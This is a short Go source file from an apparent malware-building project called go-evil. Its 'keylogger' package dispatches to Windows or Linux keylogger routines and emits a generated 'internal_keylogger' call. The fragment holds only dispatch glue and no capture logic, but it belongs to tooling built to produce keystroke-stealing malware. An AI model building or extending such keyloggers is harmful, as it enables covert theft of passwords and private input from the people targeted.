package keylogger

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Start(value string, data_object *json.Json_t) []string {
	function_call := "internal_keylogger"

	switch data_object.Target_os {

	case "windows":
		windowsInstance(function_call, data_object)

	case "linux":
		linuxInstance(function_call, data_object)

	default:
		notify.Error("The keylogger domain can only be utilized on windows and linux", "keylogger.Start()")

	}

	parameter_1 := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}

}
